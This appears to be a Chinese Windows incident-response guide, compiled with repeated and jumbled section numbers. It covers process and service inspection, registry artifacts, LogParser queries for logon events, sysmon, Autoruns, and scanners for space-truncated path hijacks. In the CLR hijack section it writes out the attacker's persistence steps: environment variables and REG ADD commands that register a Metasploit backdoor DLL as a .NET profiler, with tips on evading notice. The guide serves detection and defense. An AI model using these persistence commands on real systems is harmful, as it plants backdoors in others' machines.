`tasklist /FI "PID eq 7768" /M /V

```

### 4) 其他命令解析

`tlist -p msedge             //-p返回该进程的pid，如果该进程不存在就返回-1，如果多个，就返回首个进程的pid
tlist -w                            //返回所有进程的位数，64/32

```

### 4) 依存关系

点击服务项后，右键选择属性 -> 依存关系

可疑的服务需要关注依存关系，停止服务时可能需要将依存关系服务都需要停止，依存次服务的服务可能也是异常服务

### 5) 安全软件排查

D 盾是一个有效的工具

https://www.d99net.net/

### 5. 环境变量 CLR 劫持排查

CLR相关知识引用：

CLR ：公共语言运行库（Common Language Runtime,CLR）是整个.NET框架的核心，它为.NET应用程序提供了一个托管的代码执行环境；所以.NET 的程序，都是在CLR中运行的。

使用基于CLR的语言编译器开发的代码称为托管代码；托管代码具有许多优点，例如：跨语言集成、跨语言异常处理、增强的安全性、版本控制和部署支持、简化的组件交互模型、调试和分析服务等。

MS的一些语言，例如C#、VB、F#，都是在 CLR 中运行的，所以可以将CLR理解为他们的运行环境。

CLR劫持的根本思路就是在于：利用一个叫做托管代码分析器的东西(`Managed Profiler`) ，用于性能分析、调试和诊断.NET应用程序的工具，它可以捕获应用程序的执行信息、方法调用、资源使用情况等，并提供详细的分析报告。如果我们将托管代码分析器设置为恶意程序，那就可以劫持所有 .net 框架程序的执行

基本操作为：

 - CLR 需配置环境变量才能完全劫持 `.Net`

 - 增加 `COR_ENABLE_PROFILING` 值为 1

 - 这个环境变量是告诉 `.NET Framework` 运行时加载托管代码分析器（`Managed Profiler`）

 - 设置 `COR_PROFILER` 值为 `CLSID`

 - 这个环境变量指定托管代码分析器（`Managed Profiler`）的 `CLSID（Class ID）`

 - CLSID 可以为任意值，但不能与系统默认原有的CLSID冲突，可参照计算机原有CLSID修改，使之更不易被察觉

 利用方式如下：

 - 修改环境变量

 `    # cmd中运行以下命令：
    SETX COR_ENABLE_PROFILING 1
    SETX COR_PROFILER {AABBCCDD-1234-1234-1234-AABBCCDDEEFF}        # {}为CLSID内容

```

 - 修改注册表

 `# msf.dll为msf生成的后门dll文件
REG ADD "HKEY_CURRENT_USER\Software\Classes\CLSID\{AABBCCDD-1234-1234-1234-AABBCCDDEEFF}\InProcServer32" /VE /T REG_SZ /D "C:\msf.dll" /F

# 设置ThreadingModel = Apartment
REG ADD "HKEY_CURRENT_USER\Software\Classes\CLSID\{AABBCCDD-1234-1234-1234-AABBCCDDEEFF}\InProcServer32" /V ThreadingModel /T REG_SZ /D Apartment /F

```

所以在排查思路上，就可以重点关注环境变量内容

 - 首先可以在环境变量中重点关注是否存在 `COR_ENABLE_PROFILING` 和 `COR_PROFILER` 的键值

 `set COR         # 列出COR相关的环境变量

```

 - 通过注册表查询

 `# //列出该注册表项下所有CLSID，如果有就可以继续递归排查
reg query HKEY_CURRENT_USER\Software\Classes\CLSID\

```

### 5. Log Parser

`Log Parser` 是一款由 Microsoft 开发的强大的命令行工具，用于分析和查询各种日志文件和数据源。它可以帮助你从多种格式的日志文件中提取信息，并执行复杂的查询和分析操作。

`Log Parser` 支持多种数据源，包括文本文件（如日志文件、CSV 文件）、事件日志、注册表、IIS 日志、数据库等。它使用一种类 SQL 的查询语言，让你能够执行各种过滤、排序、统计和聚合操作。

官方下载地址：

https://download.microsoft.com/download/f/f/1/ff1819f9-f702-48a5-bbc7-c9656bc74de8/LogParser.msi

它使用 SQL 语句一样查询分析这些数据，所以使用起来稍微复杂一些，需要对SQL查询语句操作熟悉

以下语句中的 sercurity.evtx 都是从日志目录下复制到工具目录内，如果不进行复制就需要管理员启动cmd命令行来进行查询

查询系统日志EVTX语句格式：

 `LogParser.exe -i:EVT -o:DATAGRID {SQL语句}

```
 安全日志中的可查询字段内容：

 字段名 字段内容 查询方式 eventlog 所查询的日志路径 无需关注 recordnumber 该条日志索引序号 无需关注 timegenerated ※日志产生的时间 比较运算符<,>,=,<>建议结合order by xxx desc使用 timewritten 日志写入的时间 比较运算符<,>,=,<> eventid ※事件id 比较运算符等于=4624不等于<>4624 eventtype ※事件类型 比较运算符<,>,=,<> eventtpyename 事件类型描述一般是审核成功/失败 无需关注 eventcategory 事件数字类型类别 无需关注 eventcategoryname 事件类别描述 无需关注 sourcename 日志来源通常情况下是Microsoft-Windows-Security-Auditing 无需关注 strings ※事件关联数据内容登录信息登录账户登录域登录时间登录ip等信息 内容用｜分割可以使用extract_token(strings,5,'|')进行分割筛选 computername 生成事件的主机名 涉及到特殊登录时可以关注 sid 与事件关联的安全标识符 无需关注 message ※事件消息内容包含登录信息等 内容用“ ”空格分割可以使用extract_token(message,13,' ') data 二进制数据 无需关注 其中需要注意的是两个字段：

 - strings 使用 `|`对数据进行分割

 `EXTRACT_TOKEN(Strings, 0, '|')`提取S-1-5-18

`EXTRACT_TOKEN(Strings, 5, '|')`提取 IP 以此类推

 - message使用“ ”（空格）对数据进行分割，方法与上面相同

 上述帮助描述可以从官方文档中找到

根据上面的表格，我们即可通过相应的SQL语句进行查询：

 - 查询事件id为登录失败的日志，并且要最近的开始展示

 `select * from security.evtx where eventid=4625 order by timegenerated desc

```

 - 查询某个时间内的登录成功日志，并且要看所使用的用户名，ip，登录时间

 - `extract_token(strings,5,'|')`         结果为账户名

 - `extract_token(message,38,' ')`      结果为登录ip，null为本地登录

 - `timegenerated`                               结果为日志产生时间

 `select extract_token(strings,5,'|') as Username,extract_token(message,38,' ') as Loginip,timegenerated from security.evtx where timegenerated > '2022-01-01 00:00:00' and timegenerated < '2022-01-02 00:00:00' and eventid = 4624

```

以下为常用的查询语句：

 - 查询登录成功的事件

 `LogParser.exe -i:EVT -o:DATAGRID "select * from security.evtx where EventID=4624"

```

 - 查询登录失败的事件

 `LogParser.exe -i:EVT -o:DATAGRID "select * from security.evtx where EventID=4625"

```

 - 查询指定时间范围内的登录成功/失败日志

 `TimeGenerated>'2018-06-19 23:32:11' and TimeGenerated<'2018-06-20 23:34:00'`

 `LogParser.exe -i:EVT –o:DATAGRID  "SELECT *  FROM c:\Security.evtx where TimeGenerated>'2018-06-19 23:32:11' and TimeGenerated<'2018-06-20 23:34:00' and EventID=4624"

```

 - 提取登录成功/失败的用户名和IP

 `LogParser.exe -i:EVT  –o:DATAGRID  "SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,'|') as Username,EXTRACT_TOKEN(Message,38,' ') as Loginip FROM c:\Security.evtx where EventID=4624"

```

 - 筛选指定IP的远程登录成功日志

 `LogParser.exe -i:EVT  –o:DATAGRID  "SELECT * FROM c:\Security.evtx where EventID=4624" and extract_token(strings,8,"|")='10' and extract_token(strings,5,'|') = '192.168.1.1'

```

### 5. System Informer

https://systeminformer.sourceforge.io/

Process Hacker 的升级版

### 5. UserAssist

UserAssist记录基于GUI的程序执行的元数据，UserAssist 数据储存在注册表中，路径通常是

 `当前用户
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist

所有用户
HKEY_USERS\<sid>\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist

```
 其中包含多个子键，每个子键对应一个用户接口包GUID，每个GUID下记录了特定类型的用户活动，如对explorer、IE浏览器以及其他程序的使用情况。

具体而言，UserAssist 存储的信息可能包括但不限于：

 - 应用程序的启动次数
 - 应用程序最后一次被访问的时间
 - 用户在应用程序内的活动频率和持续时间
 - 可能还记录了一些额外的参数，反映用户的操作习惯

检查工具

https://www.nirsoft.net/utils/userassist_view.html

下载检查工具的同时，下载语言配置文件，放到工具同目录会自动加载

### 5. web 目录

web 目录具体位置就取决于使用的 web 服务器的配置了可以考虑使用 `webshell` 检测工具和杀毒软件进行检测

### 5. wmic

wmic 为 WMI（Windows Management Instrumentation，Windows管理工具）的扩展 ，提供了从命令行接口和批处理脚本执行系统管理的支持

可以支持快速查询系统进程相关信息，尤其是可以查询进程命令内容，这对于常规挖矿等进程，可以直接看到进程中的远程矿池地址

cmd/Powershell中输入：

 `# 列出进程列表，与tasklist命令相通
wmic process list brief

# 重要：【查看所有运行中进程的命令行参数和程序目录】
wmic process get caption,executablepath,commandline /value

# 精确查找
wmic process where caption="notepad.exe" get caption,commandline /value
# 模糊查找
wmic process where="caption like 'notepad%'" get caption,commandline /value

# 重要：【列出svchost进程的名称、进程命令、启动程序路径】
wmic process where caption="svchost.exe" get caption,commandline,executablepath /value

```

### 5. 组策略启动脚本

`gpedit.msc`为打开本地组策略编辑器

win+r中输入：

 `gpedit.msc

```
 打开本地组策略中心

计算机配置 => Windows设置 => 脚本（启动/关机）

用户配置 => Windows设置 => 脚本（登录/注销）

此处可以添加开机启动的程序、批处理文件和Powershell脚本，开机时就会根据脚本自动运行添加到程序或任务

此处的任务是不会显示在启动或msconfig里的

以下目录对应的相应的脚本存放目录

 `//计算机设置处
C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup
C:\Windows\System32\GroupPolicy\Machine\Scripts\Shutdown

//用户配置处
C:\Windows\System32\GroupPolicy\User\Scripts\Logon

```
 组策略中心启动/关机的程序或脚本位置并不是固定的，可以随意指定，也就是说最终执行以组策略配置处为准。即使上面的目录中存在程序或脚本，但是在组策略配置处没有添加，也不会执行

相关注册表

 `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts
HKEY_USERS\<sid>\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Logoff
HKEY_USERS\<sid>\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Logon

```
 【 Windows Server 2016 】 默认情况

### 5. 计划任务日志文件

打开日志管理器

 `eventvwr

```
 应用程序和服务日志 -> `Microsoft` -> `Windows` -> `TaskScheduler`

 - Maintenance  计划任务的维护事件
 - Operational    计划任务的操作和状态事件

 默认计划任务不记录操作日志，点击`启用所有任务历史记录`后，操作日志就会被记录下来了

点击后如下

日志部分主要查看 `Operational` 日志

可以看到这段时间的详细日志

Windows Server 2016 中计划任务日志相关的事件 id 我并没有在官方材料中找到准确的描述，因此这里通过手动测试

 - 创建计划任务
 - 运行计划任务
 - 新增操作
 - 禁用计划任务
 - 删除计划任务

 事件 ID 任务类别 100 计划任务启动 102 任务已完成 106 计划任务注册 110 计划任务由用户触发 129 已创建计划任务 140 任务注册已更新（修改属性） 141 任务注册已删除（直接删除计划任务） 142 任务已禁用 200 操作已启动（这就是实际执行了操作） 201 操作已完成

### 5. 注册表

### 5. 非常规查询

这部分不是常规的检查，属于是比较严谨的检查，可以根据实际情况考虑是否排查

主要排查以下内容

 - 当前操作系统中的 `WMI` 命名空间
 - 所有 `WMI` 命名空间中包含 `CommandLineEventConsumer` 类
 - 所有 `WMI` 中存在的过滤器、消费者、绑定

### 6. 安全工具检查

Autoruns 是由 Sysinternals（微软的一部分）提供的免费工具，它可以显示 Windows 启动时加载的所有程序、服务、驱动程序和其他自启动项。您可以从 Microsoft 官网下载并使用它。

https://learn.microsoft.com/zh-cn/sysinternals/downloads/autoruns

除了上面介绍的部分以外， `Autoruns` 还支持很多启动项排查

我的系统使用了 `PD` 虚拟机，同时安装了虚拟机工具，所以会有很多大家实际环境没有的

【 Windows Server 2016 】默认情况

上面是总的，可能比对不够清晰，下面为分项

【 Logon 】

【 Explorer 】

【 Scheduled Tasks 】

【 Service 】

【 Drivers 】

【 Image Hijacks 】

【 Known DLLs 】

### 6. LogParser Lizard

LogParser Lizard是基于LogParser的GUI图形化程序。

这个程序也有几年没有更新了

 - 官方下载地址：

 https://www.lizard-labs.com/log_parser_lizard.aspx

优点：

 - 相比于纯命令行化的LogParser，易于使用。
 - 可以提前写好查询日志的SQL语句，即可直接使用。
 - 展示结果来说，相比LogParser个人感觉要更好。

 缺点：

 - 官方安装包100MB+，并不适用很多环境。
 - 需要安装，然后设置编写查询命令，也并不适用很多应急场景。

 截图于官方网站：

### 6. MUICache

MUICache 是 Windows 操作系统中的一个功能，用于记录和缓存多语言用户界面（MUI）文件的信息。它主要用于加快多语言应用程序的启动速度，并提供对多语言资源的访问支持。

MUICache是Windows操作系统注册表中的一项，位于

 `当前用户
HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache

所有用户
HKEY_USERS\<sid>\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache

Vista 之前
HKEY_USERS\<sid>\Software\Microsoft\Windows\ShellNoRoam\MUICache
HKEY_USERS\<sid>\Software\Microsoft\Windows\CurrentVersion\Explorer\MUICache
HKEY_USERS\<sid>\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache

```
 解析工具

http://www.nirsoft.net/utils/muicache_view.html

### 6. query 查看当前用户启动的进程

cmd中输入：

 `query process               //查看当前用户所启动的进程

```

### 6. System Informer

https://systeminformer.sourceforge.io/

Process Hacker 的升级版

属性里可以看到服务的类型

按照执行方式和运行上下文进行分类，有以下几个常见的服务类型

 - 内核驱动程序（Kernel Driver）：内核驱动程序是在操作系统内核级别运行的服务，用于提供对硬件设备或系统资源的访问和控制。这些驱动程序通常提供底层的系统功能和硬件驱动。

 - 文件系统驱动程序（File System Driver）：文件系统驱动程序是一种特殊类型的内核驱动程序，用于管理和处理文件系统的操作。它们负责将文件和目录的操作转化为物理存储设备上的读写操作。

 - 独立进程（Own Process）：独立进程服务以其自己的进程运行，每个服务实例都有自己的进程空间。这意味着每个服务实例都在单独的进程中运行，并且具有独立的内存空间。

 - 共享进程（Share Process）：共享进程服务以与其他服务共享的进程中运行。多个服务实例可以在同一个进程中运行，共享进程资源和内存空间。这种共享可以减少系统资源的使用。

 而且可以看到 `Permissions` ，也就是权限

这里定义了服务的权限，网络上很多文章都是通过设置所有用户/用户组均不可以查询、更改服务，导致这些查询方法查询失败

### 6. 采用工具排查

Autoruns 是 `SysinternalsSuite` 套件中一款工具，可以很方便查看包括计划任务等启动项排查

https://learn.microsoft.com/zh-cn/sysinternals/downloads/sysinternals-suite

可以在可疑的计划任务上右键，从计划任务程序打开该计划任务

经过测试发现，如果在 Microsoft 新建文件夹，之后在新建文件夹中创建计划任务， Autoruns 默认无法发现

此时需要取消选中 `Hide Microsoft entries` 和 `Hide Windows entries`

这就显示出来了

### 7. 隐藏计划任务排查

如果上面的方法你都找不到计划任务，可以参考我们的文章 《计划任务的攻防战 | Window 应急响应》

https://mp.weixin.qq.com/s/y9_9P6ggxGMrdGMFT-I34A

### 7. Autoruns

Autoruns 是 `SysinternalsSuite` 套件中一款工具，可以很方便查看包括计划任务等启动项排查

https://learn.microsoft.com/zh-cn/sysinternals/downloads/sysinternals-suite

### 7. evtxLogParser

https://tools.lz520520.com/files/lz520520/logparse/evtxLogparse1.3.zip

使用方法参考文章

https://sec.lz520520.com/2019/10/298/

evtxLogParser是基于LogParser做了一个简单的命令调用，工具内预先写了关于 `smb` 和 `rdp` 两个协议的日志筛选规则，可以筛选日志内smb协议和rdp协议的登录成功或失败的日志。

虽然内置规则简单，但是胜在方便快捷，对应场景下使用简单方便。

工具使用如下：

 `evtxLogparse.exe -r success/fail xxx.evtx       # 筛选指定日志里rdp成功或失败的日志
evtxLogparse.exe -s success/fail xxx.evtx       # 筛选指定日志里smb成功或失败的日志
# 存在以上相关筛选结果，返回的结果与LogParser返回结果样子完全一样

```

### 7. RunMRU

RunMRU (Most Recently Used Run) 是Windows操作系统注册表中的一个键值，它位于

 `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKEY_USERS\<sid>\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU

```
 这个键用于存储用户最近在“运行”对话框中输入过的命令历史记录。

当你按下 Win + R 键打开“运行”对话框并在其中输入命令执行程序、打开文件或网址后，这些输入的历史记录就会被保存在 RunMRU 注册表键下。每个曾经输入过的命令都会作为一个独立的值存储在该键的右侧窗口中，键名为一个顺序编号，键值则是对应输入的命令字符串。

### 7. tlist.exe官方调试工具

tlist.exe是Microsoft官方提供的windows调试工具包中的工具之一，用于操作进程。

https://docs.microsoft.com/zh-cn/windows-hardware/drivers/debugger/tlist-commands

下载后，放在目录下，使用cmd命令行进行操作：

 `tlist /?                    //获取命令帮助

```

### 8. AppCompatFlags Registry Keys

AppCompatFlags Registry Keys 是Windows操作系统中的一组注册表键，用于记录和管理应用程序的兼容性修复和设置。它们主要用于解决旧版本应用程序在较新版本的Windows上可能出现的兼容性问题。

 `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags

```

### 8. 系统信息(msinfo32)

不知道这个程序是从哪代 Windows 加进来的，可以查看的信息不少

`win + r` 之后输入 `msinfo32` 或者直接搜索系统信息

### 8. Process Explorer

SysinternalsSuite 的一部分

https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer

可以较为清晰地看到进程之间的关系，可以看作是大号的任务管理器

### 8. sysmon

sysmon 是由 Windows Sysinternals 出品的一款 Sysinternals 系列工具之一，以系统服务和设备驱动程序的方式安装在系统上，会在系统重新启动时保持驻留状态，以监视和记录系统活动到Windows事件日志中，可以提供进程创建、网络连接、文件创建相关信息，同时收集或SIEM代理收集它生成的事件并随后对其进行分析，可以识别恶意或异常活动，并了解入侵者和恶意软件如何在用户网络上运行。

Sysmon不会对其生成的事件进行分析，也不会尝试保护自己免受攻击者攻击，因此仅作为监控工具而存在，允许其监视计算机上的某些活动并将其记录到Windows事件查看器。

在打开应用或者任何进程创建的行为发生时，Sysmon 会使用sha1（默认）、MD5、SHA256 或 IMPHASH 记录进程镜像文件的 hash 值，包含进程创建过程中的进程 GUID，每个事件中包含 session 的 GUID。除此之外记录磁盘和卷的读取请求 / 网络连接（包括每个连接的源进程，IP 地址，端口号，主机名和端口名），重要的是还可在生成初期进程事件能记录在复杂的内核模式运行的恶意软件。

优点：

 - 系统服务级别的监控，监控信息详细且全面，具体的进程信息全部能够获取到。
 - 轻量化，对系统影响非常小，安装完成后，就开始监控，同时耗费资源非常小。

 缺点：

 - 需要安装，适用于一些现场段时间排查无发现的情况下，可以尝试监控一段时间。
 - 配合sysmontools里的sysmon view能够更好的分析，也不算是缺点，但是相关工具蛮大的。
 - 相关配置文件繁琐复杂，编写难度比较高，github上有已经配置好的配置文件，但是生成的日志还是会有些多，所以单独编写配置文件过滤日志难度较高。

 准备工作：

 - sysmon官方下载链接

 https://docs.microsoft.com/zh-cn/sysinternals/downloads/sysmon

 - sysmonconfig-export.xml 配置文件下载链接：

 https://github.com/SwiftOnSecurity/sysmon-config

 - sysmontools下载链接：

 https://github.com/nshalabi/SysmonTools

### 9. 服务相关日志

`Windows Server 2016` 中主要在以下位置

 `Windows日志 -> 系统

```

服务相关的日志ID

 - 事件ID 7034 – 服务意外崩溃
 - 事件ID 7035 – 服务发送启动/停止控制。
 - 事件ID 7036 – 服务启动或停止
 - 事件ID 7040 – 启动类型更改（启动 | 按需 | 禁用）
 - 事件ID 7045 – 系统上安装了一个服务

 重点关注 `7045` 事件

### 9. LogonTracer

https://github.com/JPCERTCC/LogonTracer

LogonTracer 是一种通过可视化和分析 Windows Active Directory 事件日志来调查恶意登录的工具。此工具将主机名（或 IP 地址）和帐户名关联到与登录相关的事件中，并将其显示为图形。这样，就可以查看哪个帐户尝试以及使用了哪个主机。

借用官网的图

### 9. Prefetch

Prefetch 是Windows操作系统中的一项技术，用于加速应用程序的启动速度和系统的整体性能。它通过在系统启动或应用程序首次运行时预先读取相关文件和数据，以减少后续访问时的延迟。

文件位于 `C:\Windows\Prefetch\` ,扩展名为pf

解析工具

https://github.com/EricZimmerman/PECmd

 `PECmd.exe -d C:\Windows\Prefetch --csv c:\temp

```
 `Windows Server 2016` 中该文件夹下无文件，应该是默认没有开启 `Prefetch`

### 9. System Informer

https://systeminformer.sourceforge.io/

Process Hacker 的升级版

这个可以看作是大号的 `Process Explorer`了，但这个不是微软官方开发的

### Golang

`# 编译
go build -o check_path_blank.exe check_path_blank.go

# 使用
check_path_blank.exe <path>

```
 可以指定检查路径，例如 `C:\` ，如果不加参数。默认会检查所有的盘符的所有路径，包括共享盘符

Golang 语言的程序可能比 PowerShell 效率更高一些

 `package main

import (
    "fmt"
    "os"
    "path/filepath"
    "strings"
    "time"
)

// 获取当前系统的 PATHEXT 并返回小写的扩展名（不带点）
func getPathexts() []string {
    pathext := os.Getenv("PATHEXT")
    if pathext == "" {
        pathext = ".COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL"
    }
    items := strings.Split(strings.ToLower(pathext), ";")
    var result []string
    for _, ext := range items {
        ext = strings.TrimSpace(ext)
        ext = strings.TrimPrefix(ext, ".")
        if ext != "" {
            result = append(result, ext)
        }
    }
    return result
}

// 获取所有本地盘符（大写且存在的）
func getAllDrives() []string {
    var drives []string
    for c := 'C'; c <= 'Z'; c++ {
        drive := fmt.Sprintf("%c:\\", c)
        if _, err := os.Stat(drive); err == nil {
            drives = append(drives, drive)
        }
    }
    return drives
}

// 针对每个空格前缀检查是否有风险文件
func checkPrefixRisk(fullPath string, baseRoot string, pathexts []string) {
    if !strings.Contains(fullPath, " ") {
        return
    }
    relativePath := fullPath
    // 计算相对路径
    if strings.HasPrefix(strings.ToLower(fullPath), strings.ToLower(baseRoot)) {
        relativePath = fullPath[len(baseRoot):]
    }

    spaceIndexes := []int{}
    for idx, c := range relativePath {
        if c == ' ' {
            spaceIndexes = append(spaceIndexes, idx)
        }
    }
    for _, idx := range spaceIndexes {
        prefix := relativePath[:idx]
        base := filepath.Join(baseRoot, prefix)

        if fi, err := os.Stat(base); err == nil && !fi.IsDir() {
            fmt.Printf("[可疑文件] %s （截断自 %s）\n", base, fullPath)
        }
        for _, ext := range pathexts {
            exePath := base + "." + ext
            if fi, err := os.Stat(exePath); err == nil && !fi.IsDir() {
                fmt.Printf("[可疑可执行文件] %s （截断自 %s）\n", exePath, fullPath)
            }
        }
    }
}

func main() {
    startTime := time.Now()
    args := os.Args[1:]
    var rootDirs []string
    if len(args) == 0 {
        rootDirs = getAllDrives()
        if len(rootDirs) == 0 {
            fmt.Println("未找到任何可用盘符。")
            return
        }
    } else {
        rootDirs = args
    }

    pathexts := getPathexts()

    fmt.Printf("检测带空格路径的截断前缀可执行文件风险\n")
    fmt.Printf("开始扫描，请耐心等待... 开始时间: %v\n", startTime.Format("2006-01-02 15:04:05"))

    for _, root := range rootDirs {
        fmt.Printf("\n扫描路径: %s\n", root)
        filepath.WalkDir(root, func(path string, d os.DirEntry, err error) error {
            if err != nil {
                return nil
            }
            if !d.IsDir() {
                checkPrefixRisk(path, root, pathexts)
            }
            return nil
        })
    }

    endTime := time.Now()
    duration := endTime.Sub(startTime)
    fmt.Printf("\n扫描开始时间: %v\n", startTime.Format("2006-01-02 15:04:05"))
    fmt.Printf("扫描结束时间: %v\n", endTime.Format("2006-01-02 15:04:05"))
    fmt.Printf("总耗时: %v\n", duration.Round(time.Second))
}

```
 【 Windows Server 2016 】默认情况

 `检测带空格路径的截断前缀可执行文件风险

扫描路径: C:\
发现可疑文件: C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\HubApps (截断自 C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\HubApps Icons)
发现可疑文件: C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\HubApps (截断自 C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\HubApps Icons-journal)
发现可疑文件: C:\Windows\System32\Tasks\Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 (截断自 C:\Windows\System32\Tasks\Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64)
发现可疑文件: C:\Windows\System32\Tasks\Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 (截断自 C:\Windows\System32\Tasks\Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64 Critical)
发现可疑文件: C:\Windows\System32\Tasks\Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64 (截断自 C:\Windows\System32\Tasks\Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64 Critical)
发现可疑文件: C:\Windows\System32\Tasks\Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 (截断自 C:\Windows\System32\Tasks\Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 Critical)
发现可疑文件: C:\Windows\System32\Tasks\Microsoft\Windows\Data Integrity Scan\Data Integrity Scan (截断自 C:\Windows\System32\Tasks\Microsoft\Windows\Data Integrity Scan\Data Integrity Scan for Crash Recovery)
发现可疑可执行文件: C:\Windows\WinSxS\amd64_microsoft-windows-iis-legacysnapin_31bf3856ad364e35_10.0.14393.0_none_ae953f82c8b8a231\IIS6.msc (截断自 C:\Windows\WinSxS\amd64_microsoft-windows-iis-legacysnapin_31bf3856ad364e35_10.0.14393.0_none_ae953f82c8b8a231\IIS6 Manager.lnk)
发现可疑可执行文件: C:\Windows\WinSxS\amd64_microsoft-windows-iis-managementconsole_31bf3856ad364e35_10.0.14393.0_none_b54808dbd1ca2029\IIS.msc (截断自 C:\Windows\WinSxS\amd64_microsoft-windows-iis-managementconsole_31bf3856ad364e35_10.0.14393.0_none_b54808dbd1ca2029\IIS Manager.lnk)

```

 `检测带空格路径的截断前缀可执行文件风险
开始扫描，请耐心等待... 开始时间: 2025-07-17 21:55:58

扫描路径: C:\
[可疑文件] C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\HubApps （截断自 C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\HubApps Icons）
[可疑文件] C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\HubApps （截断自 C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\HubApps Icons-journal）
[可疑文件] C:\Windows\System32\Tasks\Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 （截断自 C:\Windows\System32\Tasks\Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64）
[可疑文件] C:\Windows\System32\Tasks\Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 （截断自 C:\Windows\System32\Tasks\Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64 Critical）
[可疑文件] C:\Windows\System32\Tasks\Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64 （截断自 C:\Windows\System32\Tasks\Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64 Critical）
[可疑文件] C:\Windows\System32\Tasks\Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 （截断自 C:\Windows\System32\Tasks\Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 Critical）
[可疑文件] C:\Windows\System32\Tasks\Microsoft\Windows\Data Integrity Scan\Data Integrity Scan （截断自 C:\Windows\System32\Tasks\Microsoft\Windows\Data Integrity Scan\Data Integrity Scan for Crash Recovery）
[可疑可执行文件] C:\Windows\WinSxS\amd64_microsoft-windows-iis-legacysnapin_31bf3856ad364e35_10.0.14393.0_none_ae953f82c8b8a231\IIS6.msc （截断自 C:\Windows\WinSxS\amd64_microsoft-windows-iis-legacysnapin_31bf3856ad364e35_10.0.14393.0_none_ae953f82c8b8a231\IIS6 Manager.lnk）
[可疑可执行文件] C:\Windows\WinSxS\amd64_microsoft-windows-iis-managementconsole_31bf3856ad364e35_10.0.14393.0_none_b54808dbd1ca2029\IIS.msc （截断自 C:\Windows\WinSxS\amd64_microsoft-windows-iis-managementconsole_31bf3856ad364e35_10.0.14393.0_none_b54808dbd1ca2029\IIS Manager.lnk）

```
 参考文章： https://mp.weixin.qq.com/s/_OLwgWbrnAhXLGdc0n_Kaw

### PowerShell

`check_path_blank.ps1 <path>

```
 可以指定检查路径，例如 `C:\` ，如果不加参数。默认会检查所有的盘符的所有路径，包括共享盘符

 `param(
    [Parameter(ValueFromRemainingArguments = $true)]
    [string[]]$Paths
)

$startTime = Get-Date

# 如果没有参数，获取所有本地盘符
if (-not $Paths -or $Paths.Count -eq 0) {
    $Paths = (Get-PSDrive -PSProvider 'FileSystem' | Where-Object { $_.Root -match '^[A-Z]:\\$' }).Root
}

# 获取可执行扩展名数组
$pathexts = $env:PATHEXT.ToLower().Split(';') | ForEach-Object { $_.TrimStart('.') } | Where-Object { $_ }

Write-Host "`n检测带空格路径的截断前缀可执行文件风险" -ForegroundColor Cyan

foreach ($rootPath in $Paths) {
    Write-Host "`n扫描路径: $rootPath" -ForegroundColor Gray

    # 递归扫描所有文件和文件夹
    Get-ChildItem -LiteralPath $rootPath -Recurse -Force -ErrorAction SilentlyContinue |
        Where-Object { $_.FullName -match '\s' } | # 路径含空格
        ForEach-Object {
            $fullPath = $_.FullName
            $baseRoot = $rootPath
            if ($fullPath.StartsWith($baseRoot)) {
                $relativePath = $fullPath.Substring($baseRoot.Length)
            } else {
                $relativePath = $fullPath
            }

            if (-not $_.PSIsContainer) {
                $spaceIndexes = (0..($relativePath.Length - 1)) | Where-Object { $relativePath[$_] -eq ' ' }
                foreach ($spaceIdx in $spaceIndexes) {
                    $prefix = $relativePath.Substring(0, $spaceIdx)
                    $checkBase = Join-Path $baseRoot $prefix

                    if (Test-Path $checkBase -PathType Leaf) {
                        Write-Host "发现可疑文件: $checkBase (截断自 $fullPath)" -ForegroundColor Yellow
                    }

                    foreach ($ext in $pathexts) {
                        $exePath = "$checkBase.$ext"
                        if (Test-Path $exePath -PathType Leaf) {
                            Write-Host "发现可疑可执行文件: $exePath (截断自 $fullPath)" -ForegroundColor Red
                        }
                    }
                }
            }
        }
}

$endTime = Get-Date
